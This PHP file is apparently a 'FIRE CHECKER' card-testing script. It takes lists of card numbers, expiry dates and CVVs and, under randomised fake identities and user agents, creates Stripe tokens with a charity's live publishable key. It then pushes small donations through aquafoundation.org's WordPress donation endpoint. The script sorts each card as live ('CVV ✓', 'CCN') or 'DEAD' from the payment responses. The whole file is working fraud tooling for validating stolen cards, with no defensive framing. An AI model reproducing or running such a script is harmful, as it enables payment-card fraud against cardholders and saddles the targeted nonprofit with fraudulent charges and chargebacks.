<?php


//================[Functions and Variables]================//

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


function get_string_between($string, $start, $end){
	$string = " ".$string;
	$ini = strpos($string,$start);
	if ($ini == 0) return "";
	$ini += strlen($start);   
	$len = strpos($string,$end,$ini) - $ini;
	return substr($string,$ini,$len);
}

$context = stream_context_create(
    array(
        "http" => array(
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        )
    )
);
$page = file_get_contents('https://aquafoundation.org/donate/', false, $context);
$nonce = get_string_between($page, '"ds_nonce":"', '"');

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


if(!isset($amount)){
    $amount='0';
}

//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$letters='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
$lettersArray = str_split($letters);
$fname = '';
$lname = '';
for($i=0; $i<7; $i++){
    $fname .= $lettersArray[array_rand($lettersArray)];
    $lname .= $lettersArray[array_rand($lettersArray)];
}
$email = $fname.$lname.rand(10,99).'@firegod.gq';
$zip = rand(10000,99999);
$useragent = 'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
//==================[End Randomizing Details]======================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_VERBOSE, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'method: POST',
    'path: /v1/payment_methods',
    'scheme: https',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: '.$useragent
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&payment_user_agent=stripe.js%2F48719cf09%3B+stripe-js-v3%2F48719cf09&time_on_page=57719&key=pk_live_51I3nckJZDigcdPcSgcw8IauAwLe6S9M0yFQBYtOJn2MjXX3knrqg0jykuNckKxhHMitYdlDDwNyC1OnjqbKQNrsG00esBGYtOe');

$result1 = curl_exec($ch);
$pmid = get_string_between($result1,'"id": "','"'); 

//=======================[1 REQ-END]==============================//


//=======================[2 REQ TOKEN]==================================//

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'method: POST',
    'path: /v1/tokens',
    'scheme: https',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: '.$useragent    
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&payment_user_agent=stripe.js%2F48719cf09%3B+stripe-js-v3%2F48719cf09&time_on_page=58752&key=pk_live_51I3nckJZDigcdPcSgcw8IauAwLe6S9M0yFQBYtOJn2MjXX3knrqg0jykuNckKxhHMitYdlDDwNyC1OnjqbKQNrsG00esBGYtOe');
$result3 = curl_exec($ch);
$token = get_string_between($result3,'"id": "','"');

//=======================[2 REQ-END]==============================//

//=====================[3 REQ]======================//


curl_setopt($ch, CURLOPT_URL, "https://aquafoundation.org/wp-admin/admin-ajax.php");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: hopeinlancaster.org',
    'method: POST',
    'path: /wp-admin/admin-ajax.php',
    'scheme: https',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://hopeinlancaster.org',
    'referer: https://hopeinlancaster.org/donations/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: '.$useragent,
    'x-requested-with: XMLHttpRequest'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$pmid.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=donation&amount=1&params%5Bvalue%5D=ds1610589064428&params%5Bname%5D=&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=1&params%5Bdescription%5D=&params%5Bpanellabel%5D=CONFIRM+DONATION&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=https%3A%2F%2Faquafoundation.org%2Fdonations%2Fthank-you%2F&params%5Berror_url%5D=https%3A%2F%2Faquafoundation.org%2Fdonations%2Ferror%2F&params%5Bbutton_id%5D=ds1610589064428&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_51I3nckJZDigcdPcSgcw8IauAwLe6S9M0yFQBYtOJn2MjXX3knrqg0jykuNckKxhHMitYdlDDwNyC1OnjqbKQNrsG00esBGYtOe&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Faquafoundation.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=&params%5Binstance%5D=ds1610589064428&params%5Bds_nonce%5D='.$nonce.'&ds_nonce='.$nonce.'');
$result2 = curl_exec($ch);
//$info = curl_getinfo($ch);
//$time = $info['total_time'];
curl_close($ch);

//===================[3 REQ END]====================//


//=======================[MADE BY]==============================//

$MADEBY = "🔥️ FIRE CHECKER 🔥️";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success "))|| (strpos($result2, "success")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
    echo '<span class="badge bg-success">#CVV ✓</span> '.$lista.' ➜ charged '.$amount.' ➜ ' . $MADEBY;
}

elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
    echo '<span class="badge bg-success">#CVV ✓</span> '.$lista.' ➜ Your card has insufficient funds ➜ ' . $MADEBY;
}

# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) ){
    echo '<span class="badge bg-warning">#CCN ✓ </span> : ' . $lista . ' ➜ CCN Live: security code is incorrect ➜ '.$MADEBY;
}
elseif(strpos($result2, "fail")){
    echo '<span class="badge bg-primary">#CCN </span> : ' . $lista . ' ➜ CCN/CVV detected ➜ '. $MADEBY;
}


#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
    echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ '. $MADEBY;
}


# -- [Stolen,Lost,Pickup Responses END ] - #



# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, "The card number is incorrect.")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Card Declined ➜ '. $MADEBY;
}

elseif (strpos($result1, 'invalid_cvc')){
    echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ invalid_cvc ➜ '. $MADEBY;
}


elseif(strpos($result2, "requires_source_action")){
    echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Card Declined: 3D-Secure ➜ '. $MADEBY;
}

elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Card Declined ➜ ' . $MADEBY;
}

elseif (strpos($result2,  'The card has expired')) {
  echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜ '. $MADEBY;
}

elseif (strpos($result2,  'Your card number is incorrect.')) {
  echo '<span class="badge bg-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Your card number is incorrect. ➜  DEAD ➜ ' . $MADEBY;
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
elseif 
(strpos($result2,  '-1')) {
    echo '<span class="badge bg-danger">Checker DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ ' . $MADEBY;
}

else {
    echo '<span class="badge bg-danger">Checker DEAD ✗ </span> : '.$lista;
}


echo "<br>".$result1."<BR>";
echo "<br>".$result3."<BR>";
echo "<br>".$nonce."<BR>";
echo "<br>".$result2."<BR>";



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//

// If not working update postfields and cookie header of 2nd REQ;

ob_flush();

/*
echo "<br>".$result1."<BR>";
echo "<br>".$result3."<BR>";
echo "<br>".$nonce."<BR>";
echo "<br>".$result2."<BR>";
*/
?>